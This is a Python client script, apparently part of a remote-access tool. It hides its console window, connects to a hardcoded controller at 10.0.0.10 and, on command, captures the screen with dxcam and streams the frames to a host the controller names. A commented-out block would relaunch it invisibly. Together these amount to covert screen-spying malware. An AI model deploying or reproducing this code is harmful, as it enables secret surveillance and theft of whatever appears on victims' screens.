import subprocess
import sys
import threading
import pickle
import socket
import time
import ctypes
import client_global_flags_a
import dxcam
import lz4.frame

global camera
global s


def init_stream(host, port):
    global camera
    global s
    host = host
    port = port
    print(host, type(host))
    print(port, type(port))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    target_fps = 24
    camera = dxcam.create(output_idx=0, output_color="BGR")


def start_stream(camera_cam, s_socket):
    print("s")
    while True:
        if client_global_flags_a.streaming:
            try:
                frame = camera_cam.grab()
                frame = pickle.dumps(frame)
                frame = lz4.frame.compress(frame)

                size = len(frame)
                size = str(size)
                size = size.encode(encoding='utf8')
                s_socket.send(size)
                ready = s.recv(10).decode()
                s_socket.sendall(frame)
            except Exception as e:
                pass


'''if sys.argv[-1] != 'hidden':
    subprocess.Popen([sys.executable] + sys.argv + ['hidden'],
                     creationflags=subprocess.CREATE_NO_WINDOW)


else:'''

SW_HIDE = 0


def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), SW_HIDE)


hide_console()
time.sleep(15)

my_socket = socket.socket()
my_socket.connect(("10.0.0.10", 44100))
while True:
    msg = my_socket.recv(1024).decode()
    print(msg)
    if msg == "UP":
        my_socket.send("UP".encode())
    if msg == "START_STREAM":
        # if not client_global_flags.stream_init:
        ip_port = my_socket.recv(1024).decode()
        # print(ip_port)
        ip = ip_port[:ip_port.index(":")]
        port = int(ip_port[ip_port.index(":") + 1:])
        init_stream(ip, port)
        t = threading.Thread(target=start_stream, args=(camera, s,))
        t.start()
        client_global_flags_a.streaming = True
        # else:
        # client_global_flags.streaming = True
    if msg == "END_STREAM":
        client_global_flags_a.streaming = False
        camera.stop()
